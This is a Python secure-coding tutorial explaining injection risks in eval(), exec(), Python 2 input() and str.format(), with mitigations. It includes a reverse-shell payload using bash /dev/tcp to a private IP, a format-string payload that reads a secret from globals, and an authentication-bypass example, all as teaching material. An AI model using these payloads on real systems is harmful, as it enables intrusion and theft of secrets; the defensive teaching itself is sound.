---
layout: engineering-education
status: publish
published: true
url: /securing-your-python-application-from-hackers/
title: Securing your Python Application from Hackers
description: This tutorial will help the readers to secure their programs in application by going over some of the dangerous functions in Python.
author: ahmad-mardeni
date: 2021-05-31T00:00:00-14:00
topics: [Security]
excerpt_separator: <!--more-->
images:

  - url: /engineering-education/securing-your-python-application-from-hackers/hero.png
    alt: Securing Your Python Application from Hackers Hero image
---
Python has become immensely useful in cybersecurity as it supports and performs a multitude of cybersecurity functions such as malware analysis, scanning, penetration testing, etc. However, its very easy to make a mistake in any Python code and make the program vulnerable.
<!--more-->
In this tutorial, I'll help you avoid those mistakes which might make your program vulnerable.

> It's possible to create a secure program using a programming language that is full of vulnerabilities, and it's also possible to create a vulnerable program using a programming language that's designed to be secure.

### Table of contents
This tutorial will cover:
- [Dangerous functions and how to protect your code](#Dangerous-functions)
  - [Eval()](#function1)
  - [Exec()](#function2)
  - [Input()](#function3)
- [String formatting exploiting](#String-formatting-exploiting)

### Dangerous functions
Some functions are dangerous, some can be used to perform a sort of code injection or an authentication bypass. Let's put ourselves in the hacker's shoes to think like them and learn how to better protect our code. 

#### Eval() <a name="function1"></a>
Python’s `eval()` gives you the ability to pass a string to execute it as code. For example, `eval("2 ** 8")` will return `256`.

Let's make a simple Python app:

```python
def addition(x, y):
  return eval("%s + %s" % (x, y))

result = addition(2, 4)
print(result)
```

This is a very simple calculator, that gives you the sum of two numbers. If you execute the code, then you will have `6` as a result.

Now let's turn this calculator to an application that uses JSON to pass user input:
```python
def addition(x, y):
  return eval("%s + %s" % (x, y))

result = addition(request.json['x'], request.json['y'])
print("Our result is %d." % result)
```

If we pass `{"x":"2", "y":"4"}` as our previous code, then the result will be `6` of course. 

Yet if we provide something else like:

```python
{"x":"__import__('os').system('bash -i >& /dev/tcp/10.0.2.15/8080 0>&1')#", "y":"4"}
```

This malicious code will force our calculator to call `os.system` then spawn a [reverse shell](https://www.sans.edu/student-files/presentations/LVReverseShell.pdf) to the IP "10.0.2.15" on PORT "8080".

> 10.0.2.15 is a [private network address](https://whatismyipaddress.com/private-ip) and it is not accessible from the internet.

#### Exec() <a name="function2"></a>
This function is similar to `eval()` which executes a string or a code object:

```python
code = 'x = 2\ny=4\nprint("result =", x+y)'
exec(code)
```

The output will be `6`. You can exploit it in the same way as we did before.

Now if you want to use those functions, you have to check which methods and variables the user is allowed to use by:

```python
exec('print(dir())')
```

The output is:

```bash
['In', 'Out', '_', '__', '___', '__builtin__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', '_dh', '_i', '_i1', '_i2', '_i3', '_i4', '_i5', '_i6', '_i7', '_i8', '_ih', '_ii', '_iii', '_oh', 'addition', 'exit', 'get_ipython', 'quit', 'result']
```

A lot of those variables and methods that are accessible may not be necessary for your code. Therefore, you can restrict it for users by passing optional `locals` and `globals` parameters to the method.

For example:

```python
from math import *
exec('print(dir())')
```

Then the output will be:

```bash
['In', 'Out', '_', '__', '___', '__builtin__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', '_dh', '_i', '_i1', '_i10', '_i11', '_i2', '_i3', '_i4', '_i5', '_i6', '_i7', '_i8', '_i9', '_ih', '_ii', '_iii', '_oh', 'acos', 'acosh', 'addition', 'asin', 'asinh', 'atan', 'atan2', 'atanh', 'ceil', 'copysign', 'cos', 'cosh', 'degrees', 'e', 'erf', 'erfc', 'exit', 'exp', 'expm1', 'fabs', 'factorial', 'floor', 'fmod', 'frexp', 'fsum', 'gamma', 'gcd', 'get_ipython', 'hypot', 'inf', 'isclose', 'isfinite', 'isinf', 'isnan', 'ldexp', 'lgamma', 'log', 'log10', 'log1p', 'log2', 'math', 'modf', 'nan', 'pi', 'pow', 'quit', 'radians', 'remainder', 'result', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau', 'trunc']
```

If we pass an empty dictionary as `globals`, then only the `__builtins__` will be available to the object. 

That means if you try to access any of the functions which are available by the math module, then it will raise an exception:

```python
from math import *
exec('print(dir())', {})
```

The output is:

```python
['__builtins__']
```

If you want to provide specific methods to use, then you need to do the following:

```python
from math import *

func = input("Enter the math function:")
try:
     exec(func, {"squareroot": sqrt,"__builtins__": None, "print": print})
        
except Exception as ex:
     print(ex)
```

This will give the user the ability to execute the `sqrt` method by using `squareroot()`. However, if he tries to use `sqrt()` then it will raise an exception. They can't use any of the **builtins** functions except `print()`.

Now if we run our code and pass `print(squareroot(16))` as input. Then the result will be `4`.

But if we try to use `print(max(1,2))` (which is a built-in function in the `math` library but it's not accessible by the exec() function), then the result will be a `TypeError` which is an Exception and will be caught by the `except` block:

```python
'NoneType' object is not subscriptable
```

#### Input() <a name="function3"></a>
You can find this vulnerability only in [Python 2](https://www.python.org/downloads/release/python-272/), not in [Python 3](https://www.python.org/downloads/).

This function in Python 2 takes the value type, as it is without changing its type.

```python
secret = 5
number = input("Guess the secret number")
if number==secret:
    print("YES")
else:
    print("NO")
```

Now we have a secret number, and we want the user to guess it. If we pass `5` then the result will be `YES` and otherwise it will be `NO`. 

If we pass `secret` then the result will be `YES` because the Python conditional now is:

```python
if secret==secret: // This will be true
```

Just like that, you can pass any password leading to authentication bypass. Also, there are a lot of other ways to exploit this function.

To fix this issue, you need to use `raw_input()` instead of `input()` while you are using Python 2. `raw_input()` will convert any given input by the user to a string. 

If you are using Python 3, you don't have to worry about it since the `input()` is the same as the `raw_input()`.

### String formatting exploiting
This can be a very dangerous method because it might lead the hackers to an authentication bypass and provide them with access to sensitive information. So how does this work?

Let's build a simple app, assume that *CONFIG* contain sensitive information like an *API keys*:

```python
CONFIG = {
    "KEY" : "SECRET_KEY"
}

class info:
    def __init__(self, first, last):
        self.first = first
        self.last = last

def getName(some_str, peopleinfo_obj):
    return some_str.format(peopleinfo_obj = peopleinfo_obj)

people = info('Ahmad', 'Mardeni')

stri = input()
getName(stri, peopleinfo_obj = people)
```

Now if the user passes the following as input:

```python
Name_is_{peopleinfo_obj.first}_{peopleinfo_obj.last}
```

Then the output will be:

```python
'Name_is_Ahmad_Mardeni'
```

But if they pass the following as input:

```python
{peopleinfo_obj.__init__.__globals__[CONFIG][KEY]}
```

Then our sensitive information will be compromised and the output will be:

```python
'SECRET_KEY'
```

That happened because the string formatting function can access attributes objects. 

And the question now; is it still good to use `str.format()`? Yes, but you have to be aware that it becomes vulnerable when it is used with user-controlled strings.

### Conclusion
We learned about the dangerous functions `eval()`, `exec()`, and `input()`, how hackers can use them to hack your Python code, and finally, how to protect yourself against them. 

You also have to pay attention to vulnerabilities besides the language-specific ones, like [XSS](https://owasp.org/www-community/attacks/xss/), [SQL injection](https://www.w3schools.com/sql/sql_injection.asp), etc...

Till next time, happy coding Pythonistas!

### Further reading
1. [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
2. [YAML Deserialization Attack in Python](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf?utm_source=dlvr.it&utm_medium=twitter)

---
Peer Review Contributions by: [Mohan Raj](/engineering-education/authors/mohan-raj/)
